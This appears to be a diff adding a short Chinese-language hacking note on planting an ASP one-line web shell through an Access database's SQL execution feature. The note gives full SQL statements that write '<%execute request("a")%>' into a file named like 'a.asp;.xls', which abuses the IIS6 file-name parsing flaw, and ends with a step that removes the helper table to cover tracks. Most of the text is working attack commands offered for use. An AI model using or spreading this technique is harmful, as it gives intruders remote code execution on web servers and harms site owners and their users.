@@ -1,0 +1,27 @@
+已经是大牛们用烂的方法了， 我刚学到呵呵。。
+原来我导出的时候利用的是text方式，在测试的时候发现分号被替换成下划线了，所以以为这种方法不行。
+后来经过大牛们的指点，才知道用excel的方式导出可以。。
+主要是利用IIS6的解析问题：
+SELECT '<%execute request("a")%>' into [a] in 'c:\x.asp;a.xls' 'excel 8.0;' from a
+会在C盘生成一个名为x.asp;a.xls的文件。
+由于ACCESS不能多句执行，所以这个方法只有在后台提供了SQL执行功能并且知道绝对路径的时候才可以用。。
+
+ 
+
+ ==========
+
+create table cmd (a varchar(50))
+insert into cmd (a) values ('<%execute request("a")%>')
+select * into [a] in 'f:\host\qhdyxt\web\a.asp;.xls' 'excel 4.0;' from cmd
+drop table cmd
+
+========
+
+1.create table a (a varchar(50)) 建立一个有一个A字段的表 表名为a 字段类型为字符 长度为50
+2.insert into a (a) values ('<%execute request("a")%>') 在表a的a字段插入密码为a的一句话木马
+3.select * into [a] in 'F:\jt\work\a.asp;.xls' 'excel 4.0;' from a 把表a的内容导出为物理路径的一个
+EXCEL文件，为什么用excel文
+件，因为ACCESS数据库不允许导出其他危险格式。我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的小马了。很*的说～～
+4.drop table a 丢家伙闪人 射完就走
+
+=====================
